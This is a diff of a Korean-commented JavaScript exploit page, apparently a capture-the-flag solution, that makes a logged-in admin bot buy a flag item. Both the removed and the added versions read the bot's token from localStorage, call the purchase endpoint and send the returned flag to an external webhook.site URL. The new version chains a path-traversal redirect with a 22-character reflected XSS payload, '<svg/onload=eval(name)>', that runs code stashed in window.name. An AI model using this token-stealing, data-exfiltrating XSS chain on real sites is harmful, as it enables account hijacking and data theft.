@@ -1,27 +1,22 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // 1. 웹후크 주소 (Webhook.site에서 복사한 주소)
-        const myWebhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
-
-        // 2. 관리자 권한으로 플래그 구매 요청 (ID 4번이 플래그)
-        // 봇은 이미 관리자로 로그인된 상태이므로 localStorage에 토큰이 있을 겁니다.
-        fetch('http://localhost:3000/4/buy', {
+<script>
+    // 1. 봇이 실행할 실제 공격 코드 (플래그 구매 후 웹후크로 전송)
+    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
+    const payload = `
+        fetch('/4/buy', {
             method: 'POST',
-            headers: {
-                'token': localStorage.getItem('token'), // 또는 document.cookie
-                'Content-Type': 'application/json'
-            }
+            headers: { 'token': localStorage.token }
         })
-        .then(res => res.json())
-        .then(data => {
-            // 3. 구매 성공 시 서버가 준 데이터(플래그)를 웹후크로 전송
-            fetch(`${myWebhook}?flag=${encodeURIComponent(data.data)}`);
-        })
-        .catch(err => {
-            fetch(`${myWebhook}?error=${encodeURIComponent(err)}`);
+        .then(r => r.json())
+        .then(d => {
+            fetch('${webhook}?flag=' + d.data);
         });
-    </script>
-</body>
-</html>
+    `;
+
+    // 2. window.name에 페이로드 저장 (페이지 이동 후에도 유지됨)
+    window.name = payload;
+
+    // 3. localhost의 XSS 취약 지점으로 리다이렉트
+    // /debug/:data는 딱 22글자까지만 출력하므로, 길이를 맞춘 페이로드를 보냅니다.
+    // <svg/onload=eval(name)> 는 정확히 22글자입니다.
+    location.href = "http://localhost:3000/#/item/1%2f..%2f..%2fdebug%2f%3csvg%2fonload%3deval(name)%3e";
+</script>
